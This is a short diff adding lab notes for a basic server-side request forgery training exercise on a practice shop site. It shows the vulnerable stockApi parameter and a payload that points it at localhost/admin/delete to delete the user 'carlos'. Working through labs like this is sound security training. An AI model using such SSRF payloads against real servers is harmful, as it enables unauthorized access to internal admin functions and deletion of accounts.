@@ -1,0 +1,17 @@
+Lab #1 : Basic SSRF against the local server
+
+info: - The stock check communicate with the server
+      - We have to change the URL of the Stock check to http://localhost/admin
+
+End Goal: Delete Carlos
+
+STEP 1: Check the vulnerable parameter
+output : stockApi=http%3a//stock.weliketoshop.net%3a8080/product/stock/check%3fproductId%3d1%26storeId%3d1
+         is vulnerable to SSRF
+
+STEP 2: Access the admin panel by changing the url
+output: We can access the admin panel and see a line in url enabling us to delete Carlos account
+
+STEP 3: Delete Carlos account
+payload : http://localhost/admin/delete?username=carlos
+output: Account deleted
